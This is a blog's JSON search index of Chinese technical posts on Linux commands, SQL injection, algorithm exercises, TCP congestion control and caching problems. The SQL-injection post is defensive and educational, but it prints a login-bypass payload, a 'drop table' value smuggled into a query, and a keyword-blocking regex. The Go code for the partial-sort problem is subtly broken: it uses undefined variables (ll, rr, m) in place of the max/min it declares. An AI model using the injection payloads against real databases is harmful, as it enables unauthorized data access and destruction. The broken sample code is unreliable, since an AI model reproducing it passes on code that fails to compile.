{"meta":{"title":"Noodles2hg的博客","subtitle":"为了freedom","description":"nothing","author":"Noodles2hg","url":"https://github.com/z-anshun","root":"/"},"pages":[{"title":"categories","date":"2020-10-08T05:07:02.000Z","updated":"2021-09-21T09:09:09.799Z","comments":false,"path":"categories/index.html","permalink":"https://github.com/z-anshun/categories/index.html","excerpt":"","text":""},{"title":"四大皆空","date":"2020-10-08T05:49:37.973Z","updated":"2020-10-08T05:49:37.973Z","comments":true,"path":"/404.html","permalink":"https://github.com/z-anshun/404.html","excerpt":"","text":""},{"title":"about","date":"2020-10-08T05:13:07.000Z","updated":"2021-09-21T09:09:46.072Z","comments":true,"path":"about/index.html","permalink":"https://github.com/z-anshun/about/index.html","excerpt":"","text":"nothing"},{"title":"links","date":"2020-10-08T05:13:07.000Z","updated":"2020-10-08T06:23:45.074Z","comments":true,"path":"links/index.html","permalink":"https://github.com/z-anshun/links/index.html","excerpt":"","text":""},{"title":"","date":"2020-10-07T15:52:46.169Z","updated":"2020-10-07T15:52:46.169Z","comments":true,"path":"js/load-aplayer.js","permalink":"https://github.com/z-anshun/js/load-aplayer.js","excerpt":"","text":"document.addEventListener(\"DOMContentLoaded\", function() { let apContainer = document.createElement(\"div\"); apContainer.id = \"aplayer\"; document.body.append(apContainer); const ap = new APlayer({ container: document.getElementById(\"aplayer\"), fixed: true, audio: [ { name: \"name\", artist: \"artist\", url: \"url.mp3\", cover: \"cover.jpg\", }, ], }); });"},{"title":"tags","date":"2020-10-08T05:03:55.000Z","updated":"2021-09-21T09:09:29.175Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/z-anshun/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-09-21T09:10:16.000Z","updated":"2021-09-21T09:10:31.957Z","comments":true,"path":"friends/index.html","permalink":"https://github.com/z-anshun/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"wc","slug":"wc","date":"2022-02-28T14:27:02.000Z","updated":"2022-03-02T12:02:22.977Z","comments":true,"path":"2022/02/28/wc/","link":"","permalink":"https://github.com/z-anshun/2022/02/28/wc/","excerpt":"","text":"wc统计文件的字节数、字数、行数 若不指定其文件名，或给予的文件名为“-”，则wc会从标准输入设备读取数据 语法wc(选项)(参数) wc [选项]... [文件]... wc [选项]... --files0-from=F 选项 -c：统计字节数，或 --bytes，显示 Bytes数 -l：统计行数，或 --lines，显示行数 -m：统计字符数，或 --chars，显示字符数 -w：统计字数，或 --words，显示字数。 -L：打印最长行的长度，或 --max-line-length 举例wc -l * # 统计当前目录下的所有文件行数及总计行数 wc -l *.js find . * | xargs wc -l * # 当前目录以及子目录的所有文件行数及总计行数 查看文件的字节数、字数、行数 wc test.txt # 输出结果 7 8 70 test.txt # 行数 单词数 字节数 文件名 用wc命名做到只打印统计数字而不打印文件名 wc -l &lt; test.txt 统计当前目录下的文件数（不含隐藏文件） # 要去除TOTAL行 expr $(ls -l | wc -l) - 1 # 输出结果 8 统计当前目录下的所有文件行数及总计行数 [root@centos7 ~]# wc -l * 21 LICENSE 270 README.md wc: example: read: Is a directory 785 lerna-debug.log 25 lerna.json wc: node_modules: read: Is a directory 23603 package-lock.json 79 package.json 3 renovate.json 24786 total","categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"}]},{"title":"lsof","slug":"lsof","date":"2022-02-22T11:42:58.000Z","updated":"2022-02-28T14:24:38.215Z","comments":true,"path":"2022/02/22/lsof/","link":"","permalink":"https://github.com/z-anshun/2022/02/22/lsof/","excerpt":"","text":"lsoflist open file 一个查看进程打开的文件的工具 在Linux中，一切皆文件。因此，通过文件不仅可以访问常规数据，还能访问网络连接和硬件。所有lsof不仅可以查看进程打开的文件、目录，还能查看进程监听的端口等 socket 相关的信息 语法lsof (选项) 选项 -a：列出打开文件所在的进程 -c&lt;进程名&gt;：列出指定进程打开的文件 -g：列出GID号进程详情 -d&lt;文件号&gt;：列出占用该文件号的进程 +d&lt;目录&gt;：列出目录下被打开的文件 +D&lt;目录&gt;：递归列出目录下被打开的文件 -n&lt;目录&gt;：列出使用NFS的文件 -i&lt;条件&gt;：列出符合条件的进程（协议、:端口、@ip） -p&lt;进程号&gt;：列出指定进程号所打开的文件 -u：列出 UID 号进程详情 实例lsof command PID USER FD type DEVICE SIZE NODE NAME init 1 root cwd DIR 8,2 4096 2 / init 1 root rtd DIR 8,2 4096 2 / init 1 root txt REG 8,2 43496 6121706 /sbin/init init 1 root mem REG 8,2 143600 7823908 /lib64/ld-2.5.so init 1 root mem REG 8,2 1722304 7823915 /lib64/libc-2.5.so init 1 root mem REG 8,2 23360 7823919 /lib64/libdl-2.5.so init 1 root mem REG 8,2 95464 7824116 /lib64/libselinux.so.1 init 1 root mem REG 8,2 247496 7823947 /lib64/libsepol.so.1 init 1 root 10u FIFO 0,17 1233 /dev/initctl migration 2 root cwd DIR 8,2 4096 2 / migration 2 root rtd DIR 8,2 4096 2 / migration 2 root txt unknown /proc/2/exe ksoftirqd 3 root cwd DIR 8,2 4096 2 / ksoftirqd 3 root rtd DIR 8,2 4096 2 / ksoftirqd 3 root txt unknown /proc/3/exe 各列信息名： Command：进程名 PID：进程标识符 PPID：夫进程表示符号（需指定-R参数） User：进程所有者 PGID：进程所属组 FD：文件描述符 Type：文件类型，如 DIR、REG 等 Device：以逗号分隔设备编号 Node：索引节点(文件在磁盘上的标识) FD 列中的常见内容有 cwd、rtd、txt、mem 和一些数字等等。其中： cwd 表示当前的工作目录； rtd 表示根目录； txt 表示程序的可执行文件； mem 表示内存映射文件； 数字表示输入输出（0输入，1输出，2标准错误）； 标准输入输出后跟着文件状态模式： u：该文件被打开并处于读取/写入模式 r：表示该文件被打开并处于只读模式 w：该文件被打开且处于写入模式 空格 | -：unknow，且没有被锁定 在文件状态模式后面，还跟着相关的锁： w：文件部分锁 W：整个文件锁 文件类型： DIR：目录 CHR：字符类型 BLK：块设备类型 UNIX：域套接字 FIFO IPv4：网际协议（IP）套接字 DEVICE：指定磁盘名称 SIZE：文件大小 NODE：索引节点（文件在磁盘上的标识） NAME REG：常规文件 常见用法 列出指定进程号打开的所有文件： lsof -p $pid 打开指定文件的进程： lsof $filename 查看哪些进程打开了某个目录，及其目录下的文件： lsof +d $filename lsof +D $filename 对指定目录进行递归 组合选项：lsof的选择间，默认为或的关系，添加-a选项，让其选项间的关系变为与 lsof -a -p $$ -d0,1,2 这里的$$为当前进程的PID，-d选项选择了文件的描述符 查看指定程序名称打开的文件： lsof -c cr 查找以字母cr开头的程序打开的文件列表 -c也支持正则表达式：lsof -c /cr[ao]/ 过滤出以 cra 和 cro 开头的程序打开的文件列表 查看被打开的和网络相关的文件，格式如下： [46][protocol][@hostname|hostaddr][:service|port] 46：表示 IP 协议的版本 protocol：表示网络协议名称，如 TCP 或 UDP hostname：或 hostaddr 表示主机地址 service：指 /etc/services 中的名称，比如 smtp 或多个服务的列表 port：表示端口号，可指定一个或多个 默认-i选项同时输出 IPv4 和 IPv6 打开的文件 lsof -i 4列出 IPv4 打开的文件；lsof -i 6列出 IPv6 打开的文件 lsof -i:22 列出与22号端口相关的文件 lsof -i TCP:1-1024列出指定范围内被打开的TCP端口 查看你被打开的 UNIX domain socket 文件 lsof -a -c sshd -U -U选择查看打开的 UNIX domain socket 文件，-c指定服务名，这里为 ssh 服务 查看某个用户打开的所有文件 lsof -u syslog -u 既可以指定用户名，也能指定用户ID kill -9 $(lsof -t -u nick) 杀掉某个用户打开了文件的所有进程，-t选项让其只输出进程的PID 统计系统打开的文件总数 lsof -P -n | wc -l -P 表示不解析端口号，-n表示不解析主机名，这两个选项主要的目的是为了提升 lsof 命令的执行速度 获取端口对应的进程ID=&gt;pid lsof -i:9881 -P -t -sTCP:LISTEN -s选择协议","categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"}]},{"title":"sort","slug":"sort和uniq","date":"2022-02-21T09:17:26.000Z","updated":"2022-02-21T14:15:55.581Z","comments":true,"path":"2022/02/21/sort-he-uniq/","link":"","permalink":"https://github.com/z-anshun/2022/02/21/sort-he-uniq/","excerpt":"","text":"sort对文本文件中所以进行排序，并将排序结果标准输出。 既可从指定文件输入，也可从 stdin 中获取输入 语法sort [option]... [FILE]... 选项 -b：忽略开头的空白 -d：仅考虑空白、字母、数字 -f：将小写字母作为大写字母考虑 -g：根据数字排序 -i：排除不可打印的字符 -M：按照非月份、一月、十二月的顺序排序 -h：根据存储容量排序（但要使用大写字母，如：2K 1G） -n：根据数字排序 -R：随机排序 -r：将结果倒叙排序 -m：将几个排序好的文件进行合并； -o：指定输入文件，而不是标准输出 -k, --key=KEYDEF： 通过一个key排序；KEYDEF给出位置和类型 -t, --field-separator=SEP ：使用SEP作为列的分隔符 参数文件 实例sort将一个文件/文本的每一行作为一个单位，相互比较，比较的原则是从首字符向后，依次按照ASCII码值进行比较，最好再将其按升序排序 anshun@LAPTOP-F0CAKEEH:~$ cat sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 eee:50:5.5 anshun@LAPTOP-F0CAKEEH:~$ sort sort.txt aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 eee:50:5.5 需要忽略相同的行，使用-u或者使用uniq： anshun@LAPTOP-F0CAKEEH:~$ sort -u sort.txt aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 anshun@LAPTOP-F0CAKEEH:~$ uniq sort.txt aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 sort的-n、-r、-k、-t选项的使用： anshun@LAPTOP-F0CAKEEH:~$ cat sort.txt AAA:BB:CC aaa:10:1.1 ccc:30:3.3 ddd:40:4.4 bbb:20:2.2 eee:50:5.5 eee:50:5.5 # 将BB列按照数字从小到大顺序排列： # -n 按数字大小排序， -k 指定列 -t 指定分隔符 anshun@LAPTOP-F0CAKEEH:~$ sort -nk 2 -t: sort.txt AAA:BB:CC aaa:10:1.1 bbb:20:2.2 ccc:30:3.3 ddd:40:4.4 eee:50:5.5 eee:50:5.5 # 将CC列数字从大到小顺序排列： # -n是按照数字大小排序，-r是以相反顺序，-k是指定需要排序的栏位，-t指定栏位分隔符为冒号 anshun@LAPTOP-F0CAKEEH:~$ sort -nrk 3 -t: sort.txt eee:50:5.5 eee:50:5.5 ddd:40:4.4 ccc:30:3.3 bbb:20:2.2 aaa:10:1.1 AAA:BB:CC -k选项的解读-k FStart.CStart,FEnd.CEnd Start部分的FStart和C.Start；C.Start是可以省略的，FEnd.CEnd也一样。 FStart.CStart，其中FStart就是表示使用的域，而CStart则表示在FStart域中从第几个字符开始算排序首字符，FEnd.CEnd没有，就默认至最后一个字符 如： #从公司英文名称的第二个字母开始排序： $ sort -t ' ' -k 1.2 facebook.txt baidu 100 5000 sohu 100 4500 google 110 5000 guge 50 3000 使用-k 1.2，表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序 例子2：只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序： $ sort -t ' ' -k 1.2,1.2 -nrk 3,3 facebook.txt baidu 100 5000 google 110 5000 sohu 100 4500 guge 50 3000 uniq显示或忽略重复的行。 语法uniq [OPTION]... [INPUT [OUTPUT]] 主要用途 将输入文件（或标准输入）中邻近的重复行写入到输出文件（或标准输出）中 当没有选项时，邻近的重复行合并为一个 选项 -c：count，在每行开头增加重复次数 -d：repeated，所有邻近的重复行只被打印一次 -D：所有邻近的重复行将全部打印 -f, --skip-fileds=N：跳过对前N个列的比较 -i：忽略大小写的差异 -s，--skip-chars=N：跳过对前N个字符的比较 -u：unique，只打印非邻近的重复行 -z：设置行终止符为NUL（空），而不是换行符 -w：只对每行前N个字符进行比较 例子# 很明显，第一行命令，只做了相邻行的去重 uniq file.txt sort file.txt | uniq sort -u file.txt # 只显示单一行 uniq file.txt sort file.txt | uniq -u # 统计各行在文件中出现的次数： sort file.txt | uniq -c # 在文件中找出重复的行 sort file.txt | uniq -d 利用sort和uniq求两个文件的并集，交集和差集 并集：cat f1.txt f2.txt | sort|uniq &gt; file.txt 交集：cat f1.txt f2.txt | sort|uniq -d &gt; file.txt 差集：这里仅举例f1.txt相对于f2.txt的差集 cat f1.txt f2.txt | sort|uniq -d &gt; tmp.txt cat f1.txt f2.txt | sort|uniq -u &gt; file.txt","categories":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/z-anshun/categories/Linux/"}],"tags":[{"name":"每日命令","slug":"每日命令","permalink":"https://github.com/z-anshun/tags/%E6%AF%8F%E6%97%A5%E5%91%BD%E4%BB%A4/"}]},{"title":"SQL注入","slug":"SQL注入","date":"2022-02-20T06:36:41.000Z","updated":"2022-02-20T06:53:39.748Z","comments":true,"path":"2022/02/20/sql-zhu-ru/","link":"","permalink":"https://github.com/z-anshun/2022/02/20/sql-zhu-ru/","excerpt":"","text":"什么是SQL注入SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞 有什么危害？ 可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限 为什么会造成？ 程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的SQL查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码 换句话说，就是将用户输入的语句，直接作为了执行语句的一部分 注入实例假设，我们的SQL处理如下： username:=r.Form.Get(\"username\") password:=r.Form.Get(\"password\") sql:=\"SELECT * FROM user WHERE username='\"+username+\"' AND password='\"+password+\"'\" Db.Exec(sql) 那么，如果用户输入的用户名为myuser' or 'foo' = 'foo' -- 然后，我们的SQL语句就变成了如下： SELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx' 也就是，我们的SQL语句，很有可能变成我们预料的执行，甚至创建用户、直接获取表单等 如何预防 限制Web应用对数据库操作的权限 检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用regexp包进行一些匹配处理，或者使用strconv包对字符串转化成其他基本类型的数据进行判断（如：int类型的转换） 如： // 正则过滤sql注入的方法 // 参数 : 要匹配的语句 func FilteredSQLInject(to_match_str string) bool { //过滤 ‘ //ORACLE 注解 -- /**/ //关键字过滤 update ,delete // 正则的字符串, 不能用 \" \" 因为\" \"里面的内容会转义 str := `(?:')|(?:--)|(/\\\\*(?:.|[\\\\n\\\\r])*?\\\\*/)|(\\b(select|update|and|or|delete|insert|trancate|char|chr|into|substr|ascii|declare|exec|count|master|into|drop|execute)\\b)` re, err := regexp.Compile(str) if err != nil { panic(err.Error()) return false } return re.MatchString(to_match_str) } 对进入数据库的特殊字符（’”\\尖括号&amp;*;等）进行转义处理，或编码转换。Go 的text/template包里面的HTMLEscapeString函数可以对字符串进行转义处理 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中，即不要直接拼接SQL语句。例如使用database/sql里面的查询函数Prepare和Query，或者Exec(query string, args ...interface{}) 在应用发布之前建议使用专业的SQL注入检测工具进行检测，以及时修补被发现的SQL注入漏洞。网上有很多这方面的开源工具，例如sqlmap、SQLninja等 避免直接打印SQL的错误信息 GORM 是如何避免的首先，GROM是对预处理进行了封装，所有个别查询可以使用到，但个别却没有，如： userInput := \"jinzhu;drop table users;\" // 安全的，会被转义 db.Where(\"name = ?\", userInput).First(&amp;user) // SQL 注入 db.Where(fmt.Sprintf(\"name = %v\", userInput)).First(&amp;user) // 会被转义 db.First(&amp;user, \"name = ?\", userInput) // SQL 注入 db.First(&amp;user, fmt.Sprintf(\"name = %v\", userInput)) 很明显，应该尽量将用户的输入当作参数输入，而不是直接进行语SQL语言的拼接 注意：GORM 打印的 SQL 日志并不像最终执行的 SQL 那样已经转义，复制和运行这些 SQL 时应当注意","categories":[{"name":"安全","slug":"安全","permalink":"https://github.com/z-anshun/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://github.com/z-anshun/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"部分排序","slug":"部分排序","date":"2022-02-13T12:01:55.000Z","updated":"2022-02-13T12:17:12.888Z","comments":true,"path":"2022/02/13/bu-fen-pai-xu/","link":"","permalink":"https://github.com/z-anshun/2022/02/13/bu-fen-pai-xu/","excerpt":"","text":"题目： 面试题 16.16. 部分排序给定一个整数数组，编写一个函数，找出索引m和n，只要将索引区间[m,n]的元素排好序，整个数组就是有序的。注意：n-m尽量最小，也就是说，找出符合条件的最短序列。函数返回值为[m,n]，若不存在这样的m和n（例如整个数组是有序的），请返回[-1,-1]。 示例： 输入： [1,2,4,7,10,11,7,12,6,7,16,18,19] 输出： [3,9] 提示： 0 &lt;= len(array) &lt;= 1000000 分析： 很明显，对于array[m+1:]，存在一个比array[m]小的数，对于array[:n]，存在一个比array[n]大的数 那我们先来看n，假设左边最大的数为max，那么array[n+1]一定大于max，也就是说，我们需要在从左往右遍历，在遍历过程中记录当前最大的值，如果当前比它小，那么这就是n的值，代码如下： max:=array[0] for i:=1;i&lt;len(array);i++{ if array[i]&lt;max{ // 该值比当前max小，为右边界 n=i }else{ // 记录当前最大 max=array[i] } } m的寻找类似，只需从右往左找到一个比当前最小值min大的，那就是m 代码实现： func subSort(array []int) []int { n:=len(array) if n&lt;=1{ return []int{-1,-1} } l:=-1 r:=-1 max:=array[0] min:=array[n-1] for i:=1;i&lt;n;i++{ if array[i]&lt;ll{ r=i }else{ max=array[i] } end:=n-1-i if array[end]&gt;rr{ l=end }else{ m=array[end] } } return []int{l,r} }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"拥塞控制协议","slug":"拥塞控制协议","date":"2022-02-07T12:43:46.000Z","updated":"2022-02-07T12:44:36.212Z","comments":true,"path":"2022/02/07/yong-sai-kong-zhi-xie-yi/","link":"","permalink":"https://github.com/z-anshun/2022/02/07/yong-sai-kong-zhi-xie-yi/","excerpt":"","text":"流量控制 什么是流量控制？目的？ 发送者发送的数据过快，接受者来不及接受，那么就会有分组丢失的情况。为了避免这种情况，我们就需要控制发送者的速度，使接收方能及时接收。其目的是防止分组丢失，控制TCP的可靠性的一方面 如何实现？ 可以使用滑动窗口协议（连续ARQ协议）实现。既保证了分组无差错、有序接收，也实现了流量控制。 主要方式为接收方返回的ACK中会包含自己的接收窗口的大小，并利用大小来控制发送方的数据发送 为啥会引发死锁？怎么避免？ 若发送者收到了一个窗口为0的应答，那么发送者就会停止发送，等待接收者的下一个应答。但是如果这个窗口不为0的应答在传输过程丢失，发送者一直等待下去，而接收者以为发送者已经收到该应答，等待接收新数据，这样双方就相互等待，从而产生死锁 TCP使用了持续计数器。每当发送者收到一个零窗口的应答后就启动该计时器。时间一到便主动发送报文询问接收者的窗口大小。若接收者仍然返回零窗口，则重置该计时器继续等待；若窗口不为0，则表示应答报文丢失了，此时重置发送窗口后开始发送，这样就避免了死锁的产生（类似于心跳包） 拥塞控制和流量控制的区别 拥塞控制： 作用于网络，防止过多的数据注入到网络中，避免出现网络负载过大的情况。常见做法为： 慢开始、拥塞避免 快重传、快恢复 流量控制： 作用于接收者，控制发送者的发送速度，从而使接收者来得及接收，防止分组的丢失 拥塞控制的算法假设： 1、数据是单方向传递，另一个窗口只发送确认； 2、接收方的缓存足够大，因此发送方的大小的大小由网络的拥塞程度来决定 慢开始算法发送方维持一个叫做拥塞窗口cwnd（congestion window）的状态变量。其变量大小取决于网络的拥塞程度，并动态的在变化。发送方让自己的发送窗口等于拥塞窗口，另外考虑到接受方的接收能力，发送窗口可能小于拥塞窗口 为啥叫慢开始？ 因为一开始不会发送大量的数据，而是先探测网络的拥塞程度，也就是由小到大逐渐增加拥塞窗口的大小 这里用报文段的个数作为拥塞窗口的大小举例说明慢开始算法，实际的拥塞窗口大小是以字节为单位的。如下图： 发送方每收到一个ack就把cwnd+1， 另外一个传输轮次所经历的时间其实就是往返时间RTT，且每经过一次传输轮次（transmission round），拥塞窗口cwnd就加倍 当然，cwnd不会无限增长，还需设置一个慢开始门限ssthresh状态变量。 当cwnd&gt;ssthresh时，改为拥塞避免算法 当cwnd=ssthresh时，慢开始与拥塞避免算法任意 注意，这里的“慢”并不是指cwnd的增长速率慢，而是指在TCP开始发送报文段时先设置cwnd=1，然后逐渐增大，这当然比按照大的cwnd一下子把许多报文段突然注入到网络中要“慢得多” 拥塞避免算法当拥塞窗口大于等设置的拥塞门限时，就需要使用该算法， 让拥塞窗口缓慢增长，即每经过一个往返时间RTT就把发送方的拥塞窗口cwnd加1（原来为每个ACK），而不是加倍。这样拥塞窗口按线性规律缓慢增长 什么是拥塞？发送了拥塞咋办？为什么怎么做？ 拥塞：没有按时收到确认，虽然没有收到确认可能是其他原因的分组丢失，但是因为无法判定，所以都当做拥塞来处理 解决：无论时慢开始阶段，还是拥塞避免阶段。只要发生了拥塞 慢开始门限ssthresh设置为出现拥塞时的发送窗口大小的一半（但不能小于2） 把拥塞窗口cwnd设置为1 再次执行慢开始算法 目的：迅速减少主机发送到网络中的分组数，使得发生拥塞的路由器有足够时间把队列中积压的分组处理完毕 拥塞窗口cwnd初始化为1个报文段，慢开始门限初始值为16 执行慢开始算法，指数规律增长到第4轮，即cwnd=16=ssthresh，改为执行拥塞避免算法，拥塞窗口按线性规律增长 假定cwnd=24时，网络出现超时（拥塞），则更新后的ssthresh=12，cwnd重新设置为1，并执行慢开始算法。当cwnd=12=ssthresh时，改为执行拥塞避免算法 乘法减小（Multiplicative Decrease）：无论是在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞，就把慢开始门限ssthresh设置为出现拥塞时的发送窗口大小的一半，并执行慢开始算法，所以当网络频繁出现拥塞时，ssthresh下降的很快，以大大减少注入到网络中的分组数 加法增大（Additive Increase）：执行拥塞避免算法后，使拥塞窗口缓慢增大，以防止过早出现拥塞 所以避免拥塞算法也叫AIMD算法 注意：“拥塞避免”并非完全能够避免了阻塞，而是使网络比较不容易出现拥塞 快重传算法快重传要求接收方在收到一个失序的报文段后就立即发出重复确认（为的是使发送方及早知道有报文段没有到达对方，可提高网络吞吐量约20%）而不要等到自己发送数据时捎带确认。快重传算法规定，发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待设置的重传计时器时间到期 b s m1 -&gt; &lt;- ack m1 m2 -&gt; &lt;- ack m2 m3 -&gt; m4 -&gt; &lt;- m3丢失 m5 -&gt; &lt;- m3丢失 m6 -&gt; &lt;- m3丢失 m3 -&gt; 快恢复算法快重传配合使用的还有快恢复算法 当发送方连续收到三个重复确认时，就执行“乘法减小”算法，把cwnd减半,并赋值给ssthresh门限（为了预防网络发生拥塞） 后面并不执行慢开始算法，而是执行执行拥塞避免算法，使cwnd缓慢增大 注意：采用了快恢复算法后，慢开始算法只会在建立TCP连接和网络超时的时候出现","categories":[{"name":"面经","slug":"面经","permalink":"https://github.com/z-anshun/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"计网","slug":"计网","permalink":"https://github.com/z-anshun/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"二叉树转双向链表","slug":"二叉树转双向链表","date":"2022-02-06T10:52:02.000Z","updated":"2022-02-06T11:07:27.557Z","comments":true,"path":"2022/02/06/er-cha-shu-zhuan-shuang-xiang-lian-biao/","link":"","permalink":"https://github.com/z-anshun/2022/02/06/er-cha-shu-zhuan-shuang-xiang-lian-biao/","excerpt":"","text":"剑指 Offer 36. 二叉搜索树与双向链表输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的循环双向链表。要求不能创建任何新的节点，只能调整树中节点指针的指向。 如： 4 | | 2 5 | | 1 3 就需要依照中序遍历的结果的双向链表 1 2 3 4 5 分析，对于一棵二叉树的更改，很明显我们需要对其所有节点进行遍历，这里采用深度优先 func dfs(n *Node){ if n==nil{ return } dfs(n.Left) // 当前n dfs(n.Right) } 那么，如果我们能记录当前n的遍历的前一个点，令其为pre 执行如下操作 // 这里不考虑左右节点，直接进行更改 pre.Right=n n.Left=pre pre=n 那么自然就成为了双向链表 代码实现： func main() { t:= CreateTree([]int{4, 2, 5, 1, 3}) link := TreeToLink(t) for i:=0;i&lt;5;i++{ fmt.Printf(\"%d\\t\",link.Val) link=link.Right } } type Node struct { Val int Left *Node Right *Node } // 层序遍历构建树 func CreateTree(arr []int) *Node { ns := []*Node{} for i, v := range arr { n := &amp;Node{Val: v} ns = append(ns, n) if i != 0 { f := ns[(i-1)/2] if i&amp;1 == 1 { f.Left = n } else { f.Right = n } } } return ns[0] } func TreeToLink(root *Node) *Node { var pre,l *Node var dfs func(n *Node) dfs= func(n *Node) { if n==nil{ return } dfs(n.Left) n.Left=pre if pre==nil{ l=n }else{ pre.Right=n } n.Left=pre pre=n dfs(n.Right) } dfs(root) // t root.Left=pre pre.Right=root return l }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"二叉树","slug":"二叉树","permalink":"https://github.com/z-anshun/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"乘积小于K的子数组","slug":"乘积小于K的子数组","date":"2022-02-02T09:56:45.000Z","updated":"2022-02-02T10:37:19.489Z","comments":true,"path":"2022/02/02/cheng-ji-xiao-yu-k-de-zi-shu-zu/","link":"","permalink":"https://github.com/z-anshun/2022/02/02/cheng-ji-xiao-yu-k-de-zi-shu-zu/","excerpt":"","text":"剑指 Offer II 009. 乘积小于 K 的子数组给定一个正整数数组 nums和整数 k ，请找出该数组内乘积小于 k 的连续的子数组的个数。 示例 1: 输入: nums = [10,5,2,6], k = 100 输出: 8 解释: 8 个乘积小于 100 的子数组分别为: [10], [5], [2], [6], [10,5], [5,2], [2,6], [5,2,6]。 需要注意的是 [10,5,2] 并不是乘积小于100的子数组。 分析： 首先，题目要求的为连续子数组，也就是说如例一的[10,2]这种不满足要求 既然为连续，那么首先便考虑到了滑动窗口的做法： 令l为左边界下标，r为右边界下标 l=0,r=0，当前窗口[10]，乘积为10，满足，符合的子数组:[10] l=0,r=1，当前窗口[10,5]，乘积为50，满足，符合的子数组：[10],[10,5],[5] l=0,r=2，当前窗口[10,5,2]，乘积为100，不满足，l++ l=1,r=2，当前窗口[5,2]，乘积为10，满足，符合的子数组：[10],[10,5],[5],[5,2],[2] l=1,r=3，当前窗口[5,2,6]，乘积为60，满足，符合的子数组：[10],[10,5],[5],[5,2],[2],[5,2,6],[2,6],[6] 进而，我们发现，每次满足时，新增的子数组个数为r-l+1，即包含新增的nums[r]的子集 代码实现： func numSubarrayProductLessThanK(nums []int, k int) int { res:=0 n:=len(nums) l:=0 now:=1 for r:=0;r&lt;n;r++{ now*=nums[r] for l&lt;r&amp;&amp;now&gt;=k{ now/=nums[l] l++ } if r&gt;=l&amp;&amp;now&lt;k{ res+=r-l+1 } } return res }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"滑动窗口","slug":"滑动窗口","permalink":"https://github.com/z-anshun/tags/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"}]},{"title":"缓存穿透、雪崩、击穿","slug":"缓存穿透、雪崩、击穿","date":"2022-02-01T12:45:37.000Z","updated":"2022-02-01T13:04:43.344Z","comments":true,"path":"2022/02/01/huan-cun-chuan-tou-xue-beng-ji-chuan/","link":"","permalink":"https://github.com/z-anshun/2022/02/01/huan-cun-chuan-tou-xue-beng-ji-chuan/","excerpt":"","text":"缓存穿透指查询一个不存在的数据，那么肯定缓存里没有，就会查找DB，如果DB也没有，那么就不会写入缓存，这就是会导致每次对该数据查询的时候都要去DB进行查询，进而缓存便失去了意义，而当流量大的时候，DB可能会直接挂掉 如何解决？ 将空值也进行缓存 if v:=reids.Get(key);v==nil{ v,err=db.Get(key) if err==db.DBNoFound{ redis.Set(key,nil) } } 使用布隆过滤器：当某个不存在时，则一定不存在 缓存雪崩缓存雪崩是指在我们设置缓存时采用了相同的过期时间，导致缓存在某一时刻同时失效，请求全部转发到DB，DB瞬时压力过重挂掉。 如何解决？ 在原有的失效时间基础上增加一个随机值，使得过期时间分散一些。 缓存击穿大量的请求同时查询一个 key 时，此时这个 key 正好失效了，还未来得急写入，就会导致大量的请求都落到数据库。 注意：缓存击穿是查询缓存中失效的 key，而缓存穿透是查询不存在的 key 如何解决？ 加分布式锁，第一个请求的线程可以拿到锁，拿到锁的线程查询到了数据之后设置缓存，其他的线程获取锁失败会等待几十ms然后重新到缓存取数据，这样便可以避免大量的请求落到数据库 func GetVal(key string)interface{}{ v:=redis.Get(key) if v==nil{ unique_key:=systemId+\"_\"+key if redis.Set(unique_key,1,\"NX\",\"PX\",30000)==1{ v=db.Get(key) redis.Set(key,v) redis.Del(unique_key) }else{ time.Sleep(50) // 休眠50ms return GetVal(key) } } return v 